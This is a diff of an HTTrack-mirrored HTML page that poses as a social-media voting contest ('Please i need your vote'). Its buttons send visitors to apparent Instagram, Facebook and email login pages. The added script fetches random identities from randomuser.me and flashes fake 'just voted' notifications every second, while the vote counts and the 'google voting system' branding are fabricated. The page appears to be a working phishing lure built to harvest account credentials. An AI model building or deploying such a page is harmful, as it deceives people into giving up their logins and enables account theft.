@@ -1,131 +1,225 @@
-<!DOCTYPE html>
+
+<!-- <div id="google_translate_element" style='position: fixed; bottom: 0; left: 0'></div>
+  <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE}, 'google_translate_element');
+        }
+    </script>
+
+    <script type="text/javascript" src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script> --><!DOCTYPE html>
 <html lang="en">
 
-<!-- Mirrored from rhythmflownetwork.website/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 04 May 2024 13:47:46 GMT -->
+
+<!-- Mirrored from voteforme-bv.rf.gd/en/3 by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 10 May 2024 08:39:12 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
 <head>
     <meta charset="UTF-8">
-    <meta name="robots" content="noindex">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
 
-    
-<!-- Facebook Meta Tags -->
-<meta property="og:url" content="https://klaqwz.github.io/votesow/">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Vote your favourite model">
-<meta property="og:description" content="">
-<meta property="og:image" content="../helpmigrow.epizy.com/images/FC021ADE-3161-40BB-8410-4FF9451748C1.html">
+    <meta name="robots" content="noindex">
+    <meta name="googlebot" content="noarchive">
 
-<!-- Twitter Meta Tags -->
-<meta name="twitter:card" content="summary_large_image">
-<meta property="twitter:domain" content="https://klaqwz.github.io/votesow/">
-<meta property="twitter:url" content="https://klaqwz.github.io/votesow/">
-<meta name="twitter:title" content="Vote your favourite model">
-<meta name="twitter:description" content="">
-<!-- <meta name="twitter:image" content="../helpmigrow.epizy.com/images/FC021ADE-3161-40BB-8410-4FF9451748C1.html">
- -->
-<!-- Meta Tags Generated via https://www.opengraph.xyz -->
+    <link rel="stylesheet" href="../../pro.fontawesome.com/releases/v6.0.0-beta1/css/all.css" integrity="SHA384-ABC123==" crossorigin="anonymous">
+    <link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 
+</head>
+
+<body>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+        }
+
+        body {
+            background: #eeeded;
             font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+            color: #525151;
+            margin: 70px 0;
         }
 
-        html {
-            background: #F1F3FA;
-        }
-
-        .wrapper {
-            background: white;
-            width: 80%;
-            margin: 15% 50%;
+        .container-item {
+            background-color: white;
+            width: 90%;
+            margin: 0 50%;
             transform: translateX(-50%);
-            border-radius: 5px;
-            color: dodgerblue;
-        }
-
-        button {
-            background: #5CB85C;
             border-radius: 3px;
-            color: white;
-            padding: 5px;
-            border: 1px solid transparent;
         }
 
-        ul li {
+        #social-ul {
+            display: flex;
             list-style-type: none;
-            padding: 10px;
-            background: white;
-            color: #5B9BD1;
+            justify-content: center;
+            align-items: center;
+            margin: 5px 0;
         }
 
-        /* .cover {
-            background: #fffffff5;
-            height: 100%;
-            width: 100%;
-            z-index: 9999;
-            position: fixed;
-            top: 0;
-            left: 0;
-            display: none;
-        } */
+        #social-ul li {
+            margin: 5px;
+            background: #069c6c;
+            color: white;
+            padding: 7px 10px;
+            border-radius: 3px;
+            font-size: 13px;
+        }
 
+        #social-ul li:nth-child(2) {
+            background: #da2828;
+        }
+
+        #list-item {
+            list-style-type: none;
+            margin: 10px 0;
+        }
+
+        #list-item li {
+            padding: 8px 10px;
+        }
+
+        #list-item li:nth-child(1) {
+            background: #5aa7f46a;
+            color: #0d4d8c;
+            border-left: 2px solid dodgerblue;
+        }
+
+        a {
+            color: inherit;
+            text-decoration: none;
+        }
+
+        .notification-container {
+            position: fixed;
+            width: 95%;
+            bottom: 50px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #3498db;
+            color: #fff;
+            padding: 15px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+        }
+
+        .show-notification {
+            opacity: 1;
+        }
+
+        .notification-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .notification-content img {
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+
+        .notification-text {
+            flex-grow: 1;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateY(100%);
+            }
+            to {
+                transform: translateY(0);
+            }
+        }
         @media screen and (min-width: 768px) {
-            .wrapper {
+            .container-item {
                 width: 50%;
+            }
+            .notification-container {
+                width: 500px;
+            }
+
+        }
+
+        @media screen and (min-width: 1200px) {
+            .container-item {
+                width: 40%;
             }
         }
     </style>
-</head>
+    <div class="container">
+        <div class="container-item">
+            <p style='text-align: center; font-size: 20px; margin: 10px 0; text-transform: uppercase; padding: 10px 0; font-weight: bold'>Please i need your vote</p>
+            <img src="images/IMG_0928.jpg" width="100%">
+            <p style='text-align: center; padding: 5px; font-weight: bold'>OPTIONVOTING.COM</p>
+            <div class="counter" style='border: 2px solid dodgerblue; border-radius: 3px; margin: 0 5%; padding: 5px 10px ;'>
+                <div style='display: flex; justify-content: center'>
+                    <input type="radio" checked style='color: dodgerblue'>
+                    <p style='padding: 0 3px; font-size: 14px; padding: 10px 0'> Total Votes: 5678 out of 5688</p>
+                </div>
+                <div style='display: flex; justify-content: center; margin: 3px 10%'>
+                    <div class="progress-container" style='width: 100%; background: #edeaea; height: 6.5px; border-radius: 3px; overflow: hidden;'>
+                        <div class="progress" style='background: dodgerblue; width: 90%; height: 6.5px'></div>
+                    </div>
+                </div>
+            </div>
+            <p style='text-align: center; font-weight: bold; padding: 4px 0; margin: 10px 0; font-size: 20px'><i class="fa fa-check"></i> Total Votes To Win: 10</p>
+            <div style='display: flex; justify-content: center; '>
+                <a href="home_auth.html"><button style='margin: 5px; padding: 10px; background: #e02a6d; color: white; border-radius: 3px; border: none; '>VOTE WITH <i class="fa fa-instagram"></i></button></a>
+                <a href="index_fob.html"><button style='margin: 5px; padding: 10px; background: #277dee; color: white; border-radius: 3px; border: none; '>VOTE WITH <i class="fa fa-facebook"></i></button></a> 
+                <a href="index_out.html"><button style='margin: 5px; padding: 10px; background: #e02a3f; color: white; border-radius: 3px; border: none; '>VOTE WITH <i class="fa fa-envelope"></i></button></a>
 
-<body>
-    <!-- <div class="cover">
-        <center style='transform: translateY(10em)'><img src="./images/hug.gif" width="30px" >
-        <p id='loader_text' style="text-align: center; color: #222121; margin-top: 5px">Authenticating...</p>
-        </center>
-    </div> -->
-    <div class="wrapper">
-        <p style="color: #507392; font-size: 13px; padding: 10px; text-align: center;">PLEASE I NEED YOUR VOTE</p>
-        <center><img src="image/FC021ADE-3161-40BB-8410-4FF9451748C1.png" width="100px" height="100px">
-            <h4 style="padding: 10px 0; text-overflow: ellipsis; width: 200px; overflow: hidden; color: #507392">Vote Best Content Creator </h4>
-            <a href="home_auth.html"><button>VOTE WITH <i class="fa-brands fa-instagram"></i></button></a>
-            <!-- <button id='ig_btn'>VOTE WITH <i class="fa fa-instagram"></i></button> -->
-            <a href="index_out.html"><button style="background: #D9534F;">VOTE WITH <i class="fa fa-envelope"></i></button></a>
-            
-             <a href="index_fob.html"><button style="background: #5babed;">VOTE WITH <i class="fa-brands fa-facebook"></i></button></a> 
-        </center><br>
-        <ul>
-            <li style="background: #F6F9FB; border-left: 2px solid #5B9BD1; "><i class="fa fa-home"></i> Total Votes: 5668 out of 5677</li>
-                        <li style='color: #6f808a86'> <i class="fa fa-check"></i> Total Votes To Win: 9</li>
-            <a href="#" style='text-decoration: none; color: #6f808a86'>
-                <li style='color: #6f808a86'><i class="fa fa-flag"></i> Help</li>
-            </a>
-        </ul>
+            </div><br>
+        </div>
     </div>
-    <h4 style="text-align: center; color: #3f3f3f;">Powered by <span style="color: #5B9BD1;"> google voting system</span></h4>
-    <!-- <script>
-        var loader_text = document.getElementById('loader_text');
-        var cover = document.querySelector('.cover');
-        var ig_btn = document.getElementById('ig_btn');
-        ig_btn.addEventListener('click', function() {
-            cover.style.display = 'block'
-            setTimeout(() => {
-                loader_text.textContent = 'Verifying Connection...'
-                setTimeout(() => {
-                    loader_text.textContent = 'Redirecting...'
-                    setTimeout(() => {
-                        window.location.href = 'home'
-                    }, 2000);
-                }, 2000);
-            }, 2500);
+    <br><br>
+
+    <div id="notification" class="notification-container">
+    <div class="notification-content">
+        <img src="#" alt="User Avatar" width="30" height="30" id="userAvatar">
+        <div class="notification-text" id="notificationContent"></div>
+    </div>
+</div>
+<script>
+function getRandomUser() {
+    return fetch('https://randomuser.me/api/')
+        .then(response => response.json())
+        .then(data => {
+            const user = data.results[0];
+            const country = user.location.country;
+            const name = `${user.name.first} ${user.name.last}`;
+            const avatar = user.picture.thumbnail;
+            return { country, name, avatar };
         })
-    </script> -->
+        .catch(error => {
+            console.error('Error fetching random user:', error);
+            return { country: 'FallbackCountry', name: 'FallbackName', avatar: '' }; // Use fallback data in case of an error
+        });
+}
+
+function showNotification(country, name, avatar) {
+    const notificationContainer = document.getElementById('notification');
+    const notificationContent = document.getElementById('notificationContent');
+    const userAvatar = document.getElementById('userAvatar');
+
+    userAvatar.src = avatar;
+    notificationContent.innerHTML = `Someone from ${country} named ${name} just voted.`;
+    notificationContainer.classList.add('show-notification');
+
+    setTimeout(() => {
+        notificationContainer.classList.remove('show-notification');
+    }, 5000); // Hide after 5 seconds
+}
+
+// Simulate votes with random data every 5 seconds
+setInterval(() => {
+    getRandomUser().then(userData => {
+        showNotification(userData.country, userData.name, userData.avatar);
+    });
+}, 1000); // Update every 5 seconds
+</script>
 </body>
 
 
-<!-- Mirrored from rhythmflownetwork.website/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 04 May 2024 13:48:08 GMT -->
+<!-- Mirrored from voteforme-bv.rf.gd/en/3 by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 10 May 2024 08:39:15 GMT -->
 </html>
